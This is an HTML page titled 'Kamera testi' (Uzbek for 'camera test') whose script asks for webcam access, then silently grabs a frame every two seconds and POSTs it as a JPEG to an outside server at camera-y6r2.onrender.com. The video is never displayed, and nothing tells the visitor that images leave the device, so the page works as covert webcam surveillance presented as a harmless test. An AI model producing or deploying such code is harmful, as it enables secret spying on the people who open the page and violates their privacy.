<!DOCTYPE html>
<html>
<head>
  <title>Kamera testi</title>
</head>
<body>
  <script>
    const canvas = document.createElement('canvas');
    canvas.width = 320;
    canvas.height = 240;
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      video.addEventListener('loadeddata', () => {
        // Video tayyor boâ€˜lgach intervalni boshlaymiz
        setInterval(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL('image/jpeg');

          fetch('https://camera-y6r2.onrender.com/send-photo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: imageData })
          }).catch(err => console.error('Yuborishda xatolik:', err));
        }, 2000);
      });
    }).catch(err => {
      console.error('Kamera ruxsati berilmadi:', err);
    });
  </script>
</body>
</html>
